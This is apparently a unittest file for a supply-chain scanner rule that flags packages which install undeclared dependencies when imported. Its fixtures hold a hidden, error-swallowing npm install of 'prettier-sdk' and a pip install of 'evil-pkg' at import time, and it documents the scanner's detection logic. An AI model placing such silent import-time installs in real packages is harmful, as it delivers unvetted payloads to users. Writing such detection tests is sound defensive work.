"""D-12 (0.1.9): a package manager's install, run by code that runs when the package is loaded, of a package the
release does not depend on.

crypto-hash-sdk 1.0.1 (the benchmark's) ran `npm uninstall prettier-sdk && npm install prettier-sdk` when it was
imported, hidden (no output, no window, any error swallowed): prettier-sdk, which it does not declare, is the
payload, fetched past every check of the release itself. It was WARN. Such an install is now a strong import-time
reason (SC-IMPORT-RISK, CRITICAL), where the release's manifest is known: npm's package.json (its own name and its
dependencies of every kind), a wheel's METADATA and an sdist's PKG-INFO (Name and Requires-Dist, extras included).

Not at install time: an installer's script fetches the optional pieces of its own (@swc/core's postinstall
installs @swc/wasm when its native binding fails). Not at use time: a command line tool installs plugins when it
is run. Nor where the manifest is not known (an sdist whose PKG-INFO names no dependency: its setup.py may). In
Python, not in a function's body unless the module runs the function when it is loaded (litellm installs an
integration's package when the integration is set up).

Payloads are inert: hosts are .invalid, nothing is installed or run.
"""
import unittest

from tests.registry._review_support import issues, manifest, scan_npm, scan_sdist, scan_wheel

WHEEL_META = "Metadata-Version: 2.1\nName: x\nVersion: 1.0\n"
REASON = "installs packages the release does not depend on"
CHS = ("import { execSync } from 'child_process';\n(function () {\n  try {\n"
       "    execSync('npm uninstall prettier-sdk && npm install prettier-sdk', { stdio: 'ignore', windowsHide: true });\n"
       "  } catch (e) { }\n})();\nexport default 1;\n")
PIP = "import subprocess, sys\nsubprocess.check_call([sys.executable, '-m', 'pip', 'install', 'evil-pkg'])\n"


def import_risk(res):
    return [(i["file"], i["sev"], i["msg"]) for i in issues(res, "SC-IMPORT-RISK")]


class NpmTests(unittest.TestCase):
    def test_an_install_at_import_of_what_it_does_not_declare(self):
        res = scan_npm({"package.json": manifest(main="index.js", dependencies={"child-process": "^1.0.2"}),
                        "index.js": CHS})
        ((file, sev, msg),) = import_risk(res)
        self.assertEqual((file, sev), ("index.js", "CRITICAL"))
        self.assertIn(REASON + " (prettier-sdk)", msg)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_what_it_declares_is_not_one(self):
        for key in ("dependencies", "optionalDependencies", "peerDependencies", "devDependencies"):
            with self.subTest(key):
                res = scan_npm({"package.json": manifest(main="index.js", **{key: {"prettier-sdk": "^1"}}),
                                "index.js": CHS})
                self.assertEqual(import_risk(res), [])

    def test_at_install_or_use_time_it_is_not_one(self):
        # an installer fetching a piece of its own (@swc/core's shape); a file nothing loads at import
        res = scan_npm({"package.json": manifest(main="index.js", scripts={"postinstall": "node postinstall.js"}),
                        "index.js": "module.exports = 1;\n", "postinstall.js": CHS.replace("export default 1;\n", ""),
                        "lib/cli.js": CHS})
        self.assertNotIn(REASON, str(issues(res, "SC-INSTALL-HOOK")))
        self.assertEqual(import_risk(res), [])
        self.assertNotIn(REASON, str(issues(res, "SC-USE-RISK")))


class PypiTests(unittest.TestCase):
    def test_a_wheel(self):
        res = scan_wheel({"x-1.0.dist-info/METADATA": WHEEL_META + "Requires-Dist: requests\n", "x/__init__.py": PIP})
        ((file, sev, msg),) = import_risk(res)
        self.assertEqual((file, sev), ("x/__init__.py", "CRITICAL"))
        self.assertIn(REASON + " (evil-pkg)", msg)
        # declared, an extra's too, under another spelling of its name
        for line in ("Requires-Dist: Evil_Pkg>=1\n", "Requires-Dist: evil.pkg; extra == 'full'\n"):
            with self.subTest(line):
                res = scan_wheel({"x-1.0.dist-info/METADATA": WHEEL_META + line, "x/__init__.py": PIP})
                self.assertEqual(import_risk(res), [])

    def test_in_a_function_only_when_the_module_runs_it(self):
        lazy = ("import subprocess, sys\n\n\ndef setup():\n"
                "    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'evil-pkg'])\n")
        meta = {"x-1.0.dist-info/METADATA": WHEEL_META + "Requires-Dist: requests\n"}
        self.assertEqual(import_risk(scan_wheel({**meta, "x/__init__.py": lazy})), [])
        for tail in ("setup()\n", "import atexit\natexit.register(setup)\n"):
            with self.subTest(tail):
                res = scan_wheel({**meta, "x/__init__.py": lazy + "\n\n" + tail})
                self.assertEqual([(f, sev) for f, sev, _m in import_risk(res)], [("x/__init__.py", "CRITICAL")])

    def test_an_sdist_whose_manifest_is_known(self):
        files = {"setup.py": "from setuptools import setup\nsetup(name='x')\n", "x/__init__.py": PIP}
        res = scan_sdist({**files, "PKG-INFO": WHEEL_META + "Requires-Dist: requests\n"})
        self.assertEqual([(f, sev) for f, sev, _m in import_risk(res)], [("x/__init__.py", "CRITICAL")])
        # a PKG-INFO that names no dependency: setup.py may, so not known
        res = scan_sdist({**files, "PKG-INFO": WHEEL_META})
        self.assertEqual(import_risk(res), [])


if __name__ == "__main__":
    unittest.main()
